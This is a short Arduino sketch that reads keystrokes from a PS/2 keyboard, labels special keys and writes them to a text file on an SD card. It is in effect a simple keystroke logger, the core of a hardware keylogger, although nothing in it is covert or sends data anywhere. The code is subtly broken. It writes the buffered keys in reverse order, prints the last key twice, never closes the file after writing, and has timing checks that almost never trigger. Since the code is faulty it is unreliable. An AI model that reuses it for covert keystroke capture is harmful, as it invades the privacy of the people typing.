#include <SD.h>
#include <PS2Keyboard.h>

const int DataPin = 2;
const int IRQpin =  3;
const int chipSelect = 10;
PS2Keyboard keyboard;
File myFile;
String keys[100];
int keylength = 0;
String kar;
unsigned long T0 = 0, T1 = 0;

void setup() {
  delay(1000);
  pinMode(chipSelect, OUTPUT);  
  while(!SD.begin(chipSelect));
  keyboard.begin(DataPin, IRQpin);
  Serial.begin(9600);
  Serial.println("KEYBOARD");
}


void loop() {
  T1 = millis();
  if (keyboard.available()) {
    
    // read the next key
    char c = keyboard.read();
    
    // check for some of the special keys
    if (c == PS2_ENTER) {
      kar = ("[Enter]");
    } else if (c == PS2_TAB) {
      kar = ("[Tab]");
    } else if (c == PS2_ESC) {
      kar = ("[ESC]");
    } else if (c == PS2_PAGEDOWN) {
      kar = ("[PgDn]");
    } else if (c == PS2_PAGEUP) {
      kar = ("[PgUp]");
    } else if (c == PS2_LEFTARROW) {
      kar = ("[Left]");
    } else if (c == PS2_RIGHTARROW) {
      kar = ("[Right]");
    } else if (c == PS2_UPARROW) {
      kar = ("[Up]");
    } else if (c == PS2_DOWNARROW) {
      kar = ("[Down]");
    } else if (c == PS2_DELETE) {
      kar = ("[Del]");
    } else {
      kar = c;
    }
    
    //while(!(myFile = SD.open("KEJARTEL.txt", FILE_WRITE)))Serial.print("=");
    
    if(T1-T0>1000){
      keys[keylength] = '\n'; keylength++;
      //myFile.println();
      //Serial.println();
    }
    keys[keylength] = kar; keylength++;
    //myFile.print(kar);
    //Serial.print(kar);
    
    //myFile.close();
  }
  if(keylength>50 || (keylength>0 && T1-T0>1000)){
    while(!(myFile = SD.open("KEJARTEL.txt", FILE_WRITE)))Serial.print("=");
    while(--keylength>=0){
      myFile.print(keys[keylength]);
    }
    keylength = 0;
    myFile.print(kar);
  }
  T0=T1;
 
}
